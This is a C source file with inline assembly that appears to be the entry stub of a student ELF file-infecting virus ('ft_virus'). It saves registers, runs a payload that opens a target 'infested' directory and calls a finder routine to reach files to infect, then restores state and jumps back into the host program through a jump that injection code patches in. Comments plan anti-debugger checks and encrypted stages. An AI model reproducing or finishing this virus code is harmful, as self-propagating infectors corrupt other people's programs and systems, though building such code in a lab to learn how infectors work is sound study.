#include "ft_virus.h"

void FORCE_INLINE push_registers()
{
	asm volatile (
		"push rbp;"
		"push 0x0;"
		"push rbx;"
		"push rax;"
		"push rdi;"
		"push rsi;"
		"push rdx;"
		"push rcx;"
		"push r8;"
		"push r9;"
		"push r10;"
		"push r11;"
		"push r12;"
		"push r13;"
		"push r14;"
		"push r15;"
		: : :
		);

}

void FORCE_INLINE pop_registers()
{
	asm volatile (
	 	"pop r15;"
		"pop r14;"
		"pop r13;"
		"pop r12;"
		"pop r11;"
		"pop r10;"
		"pop r9;"
		"pop r8;"
		"pop rcx;"
		"pop rdx;"
		"pop rsi;"
		"pop rdi;"
		"pop rax;"
		"pop rbx;"
		"pop rbp;"
		"pop rsp;"
		"add rsp, 0x8;"
		"mov rdi, 0x0;"
		: : :
		);
}

void payload()
{
	t_data data;
	int fd;
	char infested_dir[] = INFESTED_DIR;
	char hello[] = "Hello there\n";

	// check if in debugger
	// check if pid running
	// decrypt next, go next
	WRITE(1, hello, sizeof(hello));
	data.infos.pl_size = &payload_end - &payload_start;
	fd = OPEN(infested_dir, O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		payload_end();
	finder(data, fd);
	CLOSE(fd);
}

void start(void)
{
	payload();
	EXIT(0);
}

void payload_start()
{
	push_registers();
	payload();
	pop_registers();
	asm volatile (
		// "int3;"
		"jmp payload_end" : : :
	);
}

void payload_end(void)
{
	// get replaced by the jump in inject.c
	;
}

